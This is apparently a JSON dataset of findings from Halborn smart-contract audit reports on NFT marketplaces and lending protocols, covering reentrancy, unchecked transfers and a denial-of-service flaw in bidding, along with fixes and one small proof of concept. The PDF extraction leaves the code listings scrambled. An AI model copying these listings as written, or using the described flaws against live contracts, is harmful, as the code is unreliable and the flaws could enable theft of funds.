master_edition_token_account_info = next_account_info ( account_info_iter ) ?; 39 let update_authority_info = next_account_info ( account_info_iter ) ?; 40 let master_metadata_account_info = next_account_info ( account_info_iter ) ?; 41 let token_program_account_info = next_account_info ( account_info_iter ) ?; 42 let system_account_info = next_account_info ( account_info_iter ) ?; 43 let rent_info = next_account_info ( account_info_iter ) ?; 44 let metadata_program_id_account = next_account_info ( account_info_iter ) ?; 45 let metadata_mint_info = next_account_info ( account_info_iter ) ?; 46 47 let buyer_nft_fant_ata = next_account_info ( account_info_iter ) ?; the only check on buyer_wallet_account Listing 19: processor/buy_edition.rs (Lines 52) 52 if !buyer_wallet_account . is_signer { 53 54 55 msg! (\" ProgramError :: MissingRequiredSignature \" ); return Err ( ProgramError :: MissingRequiredSignature ); } 30 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Verify the buyer_wallet_account to be the owner of the buyer_nft_fant_ata account before transferring NFT authority. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team do not believe that any of the platform users are going to ever use delegation to purchase NFTs from the store. 31 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Informational"]}, {"title": "ALL NFT EDITION SALE PROFITS ARE TRANSFERRED TO THE FEE VAULT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Phantasia_Sports_NFT_Store_SPA_Solana_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "NFT owners can post sell orders on NFTs or NFT editions. When a user buys a single-edition NFT, a fixed percentage is deducted from the ask price and transferred to the fee vault. When a user buys an NFT edition, however, 100% of the ask price is transferred to the fee vault and the NFT owner receives nothing. Code Location: Listing 20: processor/buy_edition.rs (Lines 135) & spl_token :: instruction :: transfer ( token_program_account_info . key , buyer_nft_fant_ata . key , transaction_fee_fant_ata . key , buyer_wallet_account . key , &[] , seller_to_receive_fants , 128 let seller_to_receive_fants = sell_order_data . selling_price ; 129 130 msg! (\" Calling the token program to transfer FANT to Treasury ... \"); 131 invoke ( 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 ) ?; buyer_nft_fant_ata . clone () , transaction_fee_fant_ata . clone () , buyer_wallet_account . clone () , token_program_account_info . clone () , )?, &[ ], 32 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Restrict access to the ListEditionForSale instruction handler to a wallet that owns the fee vault. Remediation Plan: ACKNOWLEDGED: The Phantasia Sports team states that the idea is that edition sales will be only performed by the team and would like all proceeds to be sent directly to the treasury. 33 ", "labels": ["Halborn", "Phantasia_Sports_NFT_Store_SPA_Solana_Program", "Severity: Informational"]}, {"title": "USAGE OF BLOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_Lending_Contracts_Smart_Contract_Security_Audit_Halborn_V_1_1.pdf", "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: LendingCore.sol Line #133 LendingMethods.sol 12 LendingMethods.sol LendingMethods.sol 13 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: Solved: because their timescales are higher than 900 seconds. Stater team assumes that the use of block.timestamp is safe ", "labels": ["Halborn", "Stater_Lending_Contracts", "Severity: Low"]}, {"title": "FOR LOOP OVER DYNAMIC ARRAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_Lending_Contracts_Smart_Contract_Security_Audit_Halborn_V_1_1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, 14 based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Code Location:  LendingMethods.sol Line #~315  LendingMethods.sol Line #~329 15 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. Remediation Plan: Risk Accepted: Stater team considers appropriate the use of loops. 16 3.3 WORKFLOW TESTING ", "labels": ["Halborn", "Stater_Lending_Contracts", "Severity: Informational"]}, {"title": "ALLOWING ERC777", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ERC777 standard allows the token contract to notify senders and recipients when ERC777 tokens are sent or received from their accounts with function hooks. If the recipient of the token is a smart contract, the smart contract may cause to re-entrancy by calling another transfer function. These hooks are called as callbacks. During the tests, it was seen that the protocol could be affected by this This may vulnerability if ERC777-kind tokens are planned to be used. cause loss of funds. Code Location: Listing 1: MToken.sol (Lines 701,702,717) 696 697 698 699 700 701 702 703 704 705 706  ); 707 708 709 // /////////////////////// // EFFECTS & INTERACTIONS // ( No safe failures beyond this point ) /* We write previously calculated values into storage */ totalSupply = vars . totalSupplyNew ; accountTokens [ redeemer ] = vars . accountTokensNew ; /* We emit a Transfer event , and a Redeem event */ emit Transfer ( redeemer , address ( this ) , vars . redeemTokens ); emit Redeem ( redeemer , vars . redeemAmount , vars . redeemTokens /* We call the defense hook */ comptroller . redeemVerify ( address ( this ) , redeemer , vars .  redeemAmount , vars . redeemTokens ); 710 711 /* 13 712 * We invoke doTransferOut for the redeemer and the  redeemAmount . Note : The mToken must handle variations between ERC -20 713 *  and GLMR underlying . * * 714 715 On success , the mToken has redeemAmount less of cash . doTransferOut reverts if anything goes wrong , since we  can 't be sure if side effects occurred . 716 717 718 719 */ doTransferOut ( redeemer , vars . redeemAmount ); return uint ( Error . NO_ERROR ); Risk Level: Likelihood - 4 Impact - 3 Recommendation: The supported tokens should be white-listed to ensure that no hijacking Furthermore, check- mechanism could be implemented, such as ERC777. effect-interactions should be controlled properly to avoid any re-entrancy issue. Remediation Plan: SOLVED: Moonwell Team solved this issue by implementing Reentrancy Guard and better check-effect-interaction design to Comptroller.sol contract. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e && 762cdc4cd9a8d09f29765f9e143b25af0ebe9720 14 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Medium"]}, {"title": "USE OF DEPRECATED CHAINLINK API", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The ChainlinkOracle contract uses Chainlinks deprecated API latestAnswer (). Such functions might suddenly stop working if Chainlink stopped supporting deprecated APIs. This method will return the last value, but it is possible to check if the data is fresh. Code Location: Listing 2: ChainlinkOracle.sol (Lines 57,59) // Chainlink USD - denominated feeds store answers at 8 uint decimalDelta = uint (18) . sub ( feed . decimals () ); // Ensure that we don 't multiply the result by 0 if ( decimalDelta > 0) { 52 function getChainlinkPrice ( AggregatorV2V3Interface feed ) internal  view returns ( uint ) { 53  decimals 54 55 56 57  ; 58 59 60 61 return uint ( feed . latestAnswer () ). mul (10** decimalDelta ) return uint ( feed . latestAnswer () ); } else { } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use latestRoundData() method instead of latestAnswer (). This method allows executing some extra validations as shown as below: 15 Listing 3: Extra Validations (Lines 2,3,4) 1 ( roundId , rawPrice , , updateTime , answeredInRound ) =  AggregatorV3Interface ( feed ). latestRoundData () ; 2  than 0 \"); 3 4 require ( updateTime != 0 , \" Round is in incompleted state \"); require ( answeredInRound >= roundId , \" Stale price \" ); require ( rawPrice > 0, \" Chainlink price cannot be lower Remediation Plan: SOLVED: This issue was solved by implementing better ChainLink Oracle API call (latestRoundData()). Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e && 762cdc4cd9a8d09f29765f9e143b25af0ebe9720. 16 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Medium"]}, {"title": "ASSETS MAY LOCKED DOWN ON GOVERNORALPHA CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Eth sent to Timelock will be locked in current implementation. Code Location: Listing 4: GovernorAlpha.sol (Line 205) 200 function execute ( uint proposalId ) external { 201 require ( state ( proposalId ) == ProposalState . Queued , \"  GovernorAlpha :: execute : proposal can only be executed if it is  queued \"); 202 203 204 205 Proposal storage proposal = proposals [ proposalId ]; proposal . executed = true ; for ( uint i = 0; i < proposal . targets . length ; i ++) { timelock . executeTransaction ( proposal . targets [ i],  proposal . values [i ], proposal . signatures [ i], proposal . calldatas [ i],  proposal . eta ); 206 207 208 } } emit ProposalExecuted ( proposalId ); Proof Of Concept:  Set up the governance contracts (GovernanceAlpha, Timelock).  Send eth to timelock contract.  Set up a proposal to send 0.1 eth out. Code snippet in ether.js below. proxy refers to GovernorAlpha. Listing 5 1 2 3 4 await proxy . propose ( [ signers [3]. address ], [ ethers . utils . parseEther ( \" 0.1 \")] , [\" \" ], 17 5 6 7 ); [ ethers . BigNumber . from (0) ] , \" Send funds to 3 rd signer \"  Vote and have the proposal succeed.  Execute the proposal, the proposal number here is arbitrary. Listing 6 1 await proxy . execute (2) ; 2 await proxy . execute (2 , { value : ethers . utils . parseEther (\" 0.1 \" ) })  // this would work // this fails  0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract. Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider applying the following changes. Listing 7 function execute ( uint proposalId ) external { require ( state ( proposalId ) == ProposalState . Queued , \" 1 2  GovernorAlpha :: execute : proposal can only be executed if it is  queued \"); 3 4 5 6  proposal . values [i ], proposal . signatures [ i], proposal . calldatas [ i],  proposal . eta ); Proposal storage proposal = proposals [ proposalId ]; proposal . executed = true ; for ( uint i = 0; i < proposal . targets . length ; i ++) { timelock . executeTransaction ( proposal . targets [ i], 18 7 8 9 } } emit ProposalExecuted ( proposalId ); Reference: https://github.com/compound-finance/compound-protocol/pull/177/files Remediation Plan: SOLVED: This issue was solved by removing payable keyword and call.value() method from the execute() function on GovernorAlpha.sol contract. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e && 762cdc4cd9a8d09f29765f9e143b25af0ebe9720. 19 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Medium"]}, {"title": "SHORT CIRCUIT IS NECESSARY FOR GAS OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "If votes variable is equal to zero on GovernorAlpha.sol:_castVote() method contract should short circuit itself to consume less gas. The following lines will be executed even if votes amount is zero. Listing 8: GovernorAlpha.sol 280 if ( support ) { 281 282 283 } else { proposal . forVotes = add256 ( proposal . forVotes , votes ); proposal . againstVotes = add256 ( proposal . againstVotes ,  votes ); 284 285 286 287 288 289 290 291 } } receipt . hasVoted = true ; receipt . support = support ; receipt . votes = votes ; emit VoteCast ( voter , proposalId , support , votes ); Basically, the contract will call more functions such as add256() even it is not necessary. 20 If The same issue also exists on Well.sol:transferFrom() function. rawAmount parameter is equal to zero, the contract should short-circuit itself to prevent gas consume. The following lines will be executed even if rawAmount is equal to zero. Listing 9: Well.sol 162 if ( spender != src && spenderAllowance != uint96 ( -1) ) { 163 uint96 newAllowance = sub96 ( spenderAllowance , amount ,  \" Well :: transferFrom : transfer amount exceeds spender allowance \" ); allowances [ src ][ spender ] = newAllowance ; 164 165 166 167 168 169 170 emit Approval ( src , spender , newAllowance ); } _transferTokens ( src , dst , amount ); return true ; Code Location: Listing 10: Vulnerable Functions 1 GovernorAlpha . sol : _castVote ( address voter , uint proposalId , bool  support ) 2 Well . sol : transferFrom ( address src , address dst , uint rawAmount ) Risk Level: Likelihood - 3 Impact - 1 21 Recommendation: It is suggested to apply the following implementations for functions above. Listing 11: GovernorAlpha.sol 278 uint96 votes = well . getPriorVotes ( voter , proposal . startBlock ); 279 if ( votes == 0) { return ; 280 281 } 282 283 . . . Listing 12: Well.sol 165 uint96 amount = safe96 ( rawAmount , \" Well :: approve : amount exceeds  96 bits \" ); 166 if ( amount == 0) { 167 emit Transfer ( src , dst , 0) ; // emitting event is still  necessary for following up the transfer standart . 168 169 } 170 171 return true ; . . . Remediation Plan: NOT APPLICABLE: This issue was marked as NOT APPLICABLE since the rec- ommendation does not fit to intended behavior of Compound Protocol. Furthermore, Moonwell Team stay as close to the original contracts as possible, even if they are not completely optimal concerning gas effi- ciency, so that improvements to the original contracts may be adopted without significant refactoring, and the community can have better cer- tainty that they function similarly to other contracts with the same code. 22 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Low"]}, {"title": "GOVERNORALPHA DOES NOT CONTROL QUEUED PROPOSALS ON CANCEL METHOD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The cancel(uint proposalId) The cancel function is used to cancel the proposals. There is a check on the contract to do not cancel executed proposals. If the state of a proposal is not QUEUED yet, the contract will revert to cancel function. However, it will consume gas to achieve this. There is a missing control on the contract to only cancel QUEUED proposals. Code Location: Listing 13: GovernorAlpha.sol 210 function cancel ( uint proposalId ) public { 211 212 ProposalState state = state ( proposalId ); require ( state != ProposalState . Executed , \" GovernorAlpha ::  cancel : cannot cancel executed proposal \" ); 213 214 215 Proposal storage proposal = proposals [ proposalId ]; require ( msg . sender == guardian || well . getPriorVotes (  proposal . proposer , sub256 ( block . number , 1) ) < proposalThreshold () ,  \" GovernorAlpha :: cancel : proposer above threshold \"); 216 217 218 219 proposal . canceled = true ; for ( uint i = 0; i < proposal . targets . length ; i ++) { timelock . cancelTransaction ( proposal . targets [ i ],  proposal . values [i ], proposal . signatures [ i], proposal . calldatas [ i],  proposal . eta ); 220 221 222 223 } } emit ProposalCanceled ( proposalId ); 23 Risk Level: Likelihood - 3 Impact - 1 Recommendation: It is recommended to implement an additional check to control only QUEUED proposals are sent to this function. Listing 14: GovernorAlpha.sol (Line 212) 210 function cancel ( uint proposalId ) public { 211 212 ProposalState state = state ( proposalId ); require ( state == ProposalState . Queued , \" GovernorAlpha ::  cancel : Current proposal is not queued . \" ); Remediation Plan: NOT APPLICABLE: This issue was marked as NOT APPLICABLE since the recom- mendation does not fit to intended behavior of Compound Protocol. A proposal is eligible to be cancelled at any time before its execu- tion, including while queued in the Timelock, using this function. 24 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Moonwell-Core contracts have multiple input fields on their both public and private functions. Some of these inputs are required as address variable. During the test, it has seen all of these inputs are not protected against using the address(0) as the target address. It is not recommended to use zero address as target addresses on the contracts. Code Location: Listing 15: Missing Zero Address Checks 1 ChainlinkOracle . setAdmin ( address ). newAdmin ( contracts / Chainlink /  ChainlinkOracle . sol #88) 2 Comptroller . _setBorrowCapGuardian ( address ). newBorrowCapGuardian (  contracts / Comptroller . sol #968) 3 Comptroller . _setPauseGuardian ( address ). newPauseGuardian ( contracts  / Comptroller . sol #986) 4 Comptroller . setWellAddress ( address ). newWellAddress ( contracts /  Comptroller . sol #1351) 5 MErc20 . initialize ( address , ComptrollerInterface , InterestRateModel ,  uint256 , string , string , uint8 ). underlying_ ( contracts / MErc20 . sol #21) 6 MToken . _setPendingAdmin ( address ). newPendingAdmin ( contracts / MToken  . sol #1144) 7 MErc20Delegator . constructor ( address , ComptrollerInterface ,  InterestRateModel , uint256 , string , string , uint8 , address , address ,  bytes ). admin_ ( contracts / MErc20Delegator . sol #31) 8 MErc20Delegator . _setImplementation ( address , bool , bytes ).  implementation_ ( contracts / MErc20Delegator . sol #60) 9 MErc20Immutable . constructor ( address , ComptrollerInterface ,  InterestRateModel , uint256 , string , string , uint8 , address ). admin_ (  contracts / MErc20Immutable . sol #29) 10 MGlimmer . constructor ( ComptrollerInterface , InterestRateModel ,  uint256 , string , string , uint8 , address ). admin_ ( contracts / MGlimmer .  sol #27) 25 11 Reservoir . constructor ( uint256 , EIP20Interface , address ). target_ (  contracts / Reservoir . sol #32) 12 Timelock . constructor ( address , uint256 ). admin_ ( contracts / Timelock .  sol #26) 13 Timelock . executeTransaction ( address , uint256 , string , bytes , uint256 ).  target ( contracts / Timelock . sol #81) 14 Unitroller . _setPendingImplementation ( address ).  newPendingImplementation ( contracts / Unitroller . sol #38) 15 Unitroller . _setPendingAdmin ( address ). newPendingAdmin ( contracts /  Unitroller . sol #85) Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to implement additional zero address checks to avoid usage of zero addresses contracts. Remediation Plan: RISK ACCEPTED: The Moonwell Team accepts the risk of this finding. Except the ChainlinkOracle contract, all the contracts mentioned require the new admin key to execute the _acceptPendingAdmin function, which protects against accidental attempts to set the admin or guardian to the zero address. It was decided not to make any changes. 26 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Low"]}, {"title": "MULTIPLE PRAGMA DEFINITION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Moonwell contracts use different pragma versions. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma ver- sion that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. The latest pragma version (0.8.11) was released in December 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just few months. Reference: Solidity Releases In the Solidity GitHub repository, there is a JSON file with all bugs It should be noted that finding in the different compiler versions. pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: Solidity bugs by version Code Location: Different pragma versions in use: Listing 16 1 DAIInterestRateModel . sol - Pragma Version 0.5.16 2 Other Contracts - Pragma Version 0.5.17 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider locking and using a single pragma version without known bugs for the compiler version. If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities, such as a pragma between 0.6.12 - 0.7.6, or the latest pragma 0.8.9 - 0.8.11. For example, after the Solidity v 0.8.x, arithmetic operations revert to underflow and overflow by default. By using this version, utility contracts like SafeMath.sol would not be needed. Remediation Plan: issue SOLVED: This DAIInterestRateModel.sol community, so this contract has been removed from the repository. Moonwell Team. by solved contract used was not the the by is The Moonwell 28 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Informational"]}, {"title": "UNUSED FUNCTION PARAMETERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the test, it was determined that a variable on the contract was not used for any purpose, although it was defined on the contract. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code. baseRatePerYear The DAIInterestRateModelV3.sol contract is unused on that function. updateJumpRateModel parameter of function on Code Location: Listing 17: DAIInterestRateModelV3.sol (Line 51) require ( msg . sender == owner , \" only the owner may call this 51 function updateJumpRateModel ( uint baseRatePerYear , uint gapPerYear  , uint jumpMultiplierPerYear , uint kink_ ) external { 52  function .\" ); 53 54  kink_ ); 55 56 gapPerTimestamp = gapPerYear / timestampsPerYear ; updateJumpRateModelInternal (0 , 0 , jumpMultiplierPerYear , poke () ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to review baseRatePerYear variable, and delete it from the contract if this variable will be remained unused in the future. 29 Remediation Plan: This issue SOLVED: The solved DAIInterestRateModel.sol contract is not used by the Moonwell community, so this contract has been removed from the repository. Moonwell Team. has the was by 30 ", "labels": ["Halborn", "Moonwell_Finance", "Severity: Informational"]}, {"title": "INCORRECT LOGIC LEADS TO DOS IN AUCTION SALES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract Marketplace.sol, the function placeBid is used to buy an NFT token listing. If the listingType is a RESERVE_PRICE_AUCTION, the function follows this code: Listing 1: Marketplace.sol - placeBid (Lines 331,332,370,374) 330 else if ( listing . listingType == ListingType . RESERVE_PRICE_AUCTION ) 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 { if ( listing . endTime == 0) { // If this is the first bid , ensure it 's >= the reserve price require ( listing . price <= bidValueInListingCurrency , \" NFTMarketReserveAuction : Bid must be at least the reserve price \" ); listing . price = bidValueInListingCurrency ; listing . buyerPaymentWallet = payable ( msgSender () ); listing . buyerTokenWallet = payable ( buyerTokenWallet ); listing . bidCurrency = currency ; listing . bidAmount = bidValue ; // On the first bid , the endTime is now + duration listing . endTime = block . timestamp + listing . duration ; emit AuctionBidPlaced ( listing . listingId , msgSender () , bidValue , listing . endTime ); } else { // If this bid outbids another , confirm that the bid is at least x % greater than the last require ( listing . endTime >= block . timestamp , \" NFTMarketReserveAuction : Auction is over \" ); require ( listing . buyerPaymentWallet != msgSender () , \" NFTMarketReserveAuction : You already have an outstanding bid \" ); uint256 minAmount = ( listing . price * ( BASIS_POINTS + _auctionPercentIncrementInBasisPoints )) / 14 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 BASIS_POINTS ; require ( bidValueInListingCurrency >= minAmount , \" NFTMarketReserveAuction : Bid amount too low \" ); // Cache and update bidder state before a possible reentrancy ( via the value transfer ) uint256 originalAmount = listing . bidAmount ; address payable originalBidder = listing . buyerPaymentWallet ; listing . price = bidValueInListingCurrency ; listing . bidCurrency = currency ; listing . bidAmount = bidValue ; listing . buyerPaymentWallet = payable ( msgSender () ); listing . buyerTokenWallet = payable ( buyerTokenWallet ); // When a bid outbids another , check to see if a time extension should apply . if ( listing . endTime - block . timestamp < listing . extensionDuration ) { listing . endTime = block . timestamp + listing . extensionDuration ; } if ( currencyType == 2) { IERC20 ( currencyContractAddress ). transferFrom ( msgSender () , address ( this ) , bidValue ); } emit AuctionBidPlaced ( listing . listingId , msgSender () , bidValue , listing . endTime ); _sendValue ( originalBidder , originalAmount , _gasLimitMedium ); 375 376 } } For the first bid, if (listing.endTime == 0) code block, the contract does not call sendValue nor transferFrom(msgSender(), address(this), bidValue );. This means that a user can place a bid as high as he wants and the contract would not check if the user actually owns those tokens. If the amount bid is high enough, none else would be able to place a higher bid. This happens because after the first bid, the contract does require the user to send the tokens to the contract by calling sendValue 15 and transferFrom function as seen above. Denial of Service example First bid vs. Second bid Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to force the bidder of the first bid to transfer the amount into the contract following the same logic that the smart contract currently has now for all the bids that are not the first one. This can be achieved by simply adding these lines into the if (listing.endTime == 0) 16 code block: Listing 2: Marketplace.sol - placeBid 1 if ( currencyType == 2) { 2 IERC20 ( currencyContractAddress ). transferFrom ( msgSender () , address ( this ) , bidValue ); 3 } 4 5 _sendValue ( originalBidder , originalAmount , _gasLimitMedium ); Remediation Plan: SOLVED: Rario team successfully fixed the placeBid function logic, correcting this vulnerability. 17 ", "labels": ["Halborn", "Rario", "Severity: High"]}, {"title": "OUTBID USER DOES NOT RECEIVE BACK HIS FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract Marketplace.sol, the function placeBid is used to buy an NFT token listing. In case that the listingType is a RESERVE_PRICE_AUCTION , when a user places a bid, the amount of tokens bid are transferred from his account to the contract address. Then, when a user outbids the previous user, the new user token amount bid is also transferred to the contract but the previous outbid user is not sent his bid tokens back: It is worth mentioning that this issue does not occur when the payment is done with NATIVE currency. In this case, the funds are sent back to the outbid user. The issue only happens when the payment is done with TOKENS. Risk Level: Likelihood - 3 Impact - 5 18 Recommendation: It is recommended that the smart contract sends back the bid tokens to the outbid user once a higher bid is placed. Remediation Plan: SOLVED: Rario team rightly modified the placeBid function and now refunds are given to the outbid users. 19 ", "labels": ["Halborn", "Rario", "Severity: High"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract Marketplace.sol the return value of some external transfer/transferFrom calls are not checked. Several tokens do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location:  Line 370: IERC20(currencyContractAddress).transferFrom(msgSender() , address(this), bidValue);  Line 611: IERC20(contractAddress).transferFrom(msgSender(), _treasury, platformPayableAmount);  Line 612: IERC20(contractAddress).transferFrom(msgSender(), seller , sellerPayableAmount); Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20. Remediation Plan: SOLVED: Rario team uses now SafeERC20 in all the transfers. 20 ", "labels": ["Halborn", "Rario", "Severity: Medium"]}, {"title": "USE OF TRANSFER WHEN TRANSFERRING NFTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract Marketplace.sol the function IERC721(_trustedToken). transferFrom is called when transferring the NFT:  Line 351: IERC721(_trustedToken).transferFrom(address(this), 539: IERC721(_trustedToken).transferFrom(_msgSender(), sellerTokenWallet, tokenId); address(this), tokenId);  Line  Line 622: IERC721(_trustedToken).transferFrom(address(this), listing.buyerTokenWallet, listing.tokenId); However, this function does not check whether the recipient is aware of the ERC721 protocol and calls _transfer directly. If the recipient is a contract not aware of incoming NFTs, then the transferred NFT would be locked in the recipient forever. Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to use SafeTransferFrom which internally calls _safeTransfer the onERC721Received interface to avoid loss of NFTs. implements recipient checking contract the if Remediation Plan: SOLVED: Rario team uses IERC721.safeTransferFrom when sending the token from the smart contract to any user/wallet: 21 IERC721(_trustedToken).safeTransferFrom(address(this), listing. buyerTokenWallet, listing.tokenId); At the same time, to avoid implementing the onERC721Received function, Rario team has decided to keep using IERC721.transfer when transferring tokens from any user to their smart contract address: IERC721(_trustedToken).transferFrom(_msgSender(), address(this), tokenId); 22 ", "labels": ["Halborn", "Rario", "Severity: Low"]}, {"title": "UPDATEUSER FUNCTION MISSING REQUIRE STATEMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract UserDB.sol the function addUser checks that the wallet address has not been added previously: Listing 3: UserDB.sol - addUser (Lines 45) 41 function addUser ( uint256 rarioId , address walletAddress ) external override { _checkRole ( OPERATOR , msgSender () ); require ( walletAddress != address (0) , ERR_ZERO_ADDRESS_WALLET ); require (! rarioIds . contains ( rarioId ) , ERR_USER_ALREADY_EXISTS ); require ( walletAddressToRarioId [ walletAddress ] == 0, ERR_WALLET_ALREADY_EXISTS ); rarioIds . add ( rarioId ); rarioIdToWalletAddress [ rarioId ] = walletAddress ; walletAddressToRarioId [ walletAddress ] = rarioId ; emit UserAdded ( rarioId , walletAddress ); 42 43 44 45 46 47 48 49 50 51 } The function updateUser allows to update that address but is missing that validation: Listing 4: UserDB.sol - updateUser 140 function updateUser ( uint256 rarioId , address walletAddress ) external override { _checkRole ( OPERATOR , msgSender () ); require ( walletAddress != address (0) , ERR_ZERO_ADDRESS_WALLET ); require ( rarioIds . contains ( rarioId ) , ERR_USER_DOES_NOT_EXIST ); address oldAddress = rarioIdToWalletAddress [ rarioId ]; rarioIdToWalletAddress [ rarioId ] = walletAddress ; walletAddressToRarioId [ walletAddress ] = rarioId ; delete walletAddressToRarioId [ oldAddress ]; 141 142 143 144 145 146 147 148 149 150 23 151 152 } emit UserUpdated ( rarioId , oldAddress , walletAddress ); This can cause some inconsistencies, for example, with the function getUserByAddress: Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to add the missing require statement to the updateUser function. Remediation Plan: SOLVED: Rario team added the missing require statement: Listing 5: UserDB.sol - updateUser (Lines 144) 140 function updateUser ( uint256 rarioId , address walletAddress ) external override { _checkRole ( OPERATOR , _msgSender () ); require ( walletAddress != address (0) , ERR_ZERO_ADDRESS_WALLET ); require ( rarioIds . contains ( rarioId ) , ERR_USER_DOES_NOT_EXIST ); require ( walletAddressToRarioId [ walletAddress ] == 0, ERR_WALLET_ALREADY_EXISTS ); address oldAddress = rarioIdToWalletAddress [ rarioId ]; 141 142 143 144 145 146 24 147 148 149 150 151 152 153 } rarioIdToWalletAddress [ rarioId ] = walletAddress ; walletAddressToRarioId [ walletAddress ] = rarioId ; delete walletAddressToRarioId [ oldAddress ]; emit UserUpdated ( rarioId , oldAddress , walletAddress ); 25 ", "labels": ["Halborn", "Rario", "Severity: Low"]}, {"title": "MINT FUNCTION IN RARIOPOLYGONNFT DOES NOT VERIFY IF TOKEN WAS WITHDRAWN", 